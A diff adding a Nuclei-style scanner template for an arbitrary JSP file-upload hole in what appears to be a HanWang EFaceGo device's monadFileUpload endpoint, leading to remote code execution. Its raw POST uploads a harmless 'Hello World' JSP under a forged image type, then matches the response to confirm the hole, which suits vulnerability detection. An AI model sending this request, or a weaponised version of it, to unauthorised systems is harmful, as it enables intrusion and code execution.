@@ -1,0 +1,42 @@
+id: HanWangEFaceGo-monadFileUpload-WriteToRCE
+
+info:
+  name: HanWangEFaceGo-monadFileUpload-WriteToRCE
+  author: iSee857
+  severity: critical
+  description: HanWangEFaceGo-monadFileUpload-WriteToRCE
+  reference:
+    - https://example.com/vuln-details
+  tags: file-upload,jsp,rce
+
+http:
+  - raw:
+      - |
+        POST /manage/leaveList/monadFileUpload.do?recoToken=67mds2pxXQb&type= HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+        Accept-Encoding: gzip, deflate
+
+        ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+        Content-Disposition: form-data; name="file"; filename="1.jsp"
+        Content-Type: image/jpeg
+
+        <% out.print("Hello World!"); %>
+        ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
+
+    attack: batteringram
+    redirects: true
+    max-redirects: 3
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - ".jsp"
+          - "true"
+          - "obj"
+        condition: and
+        part: body
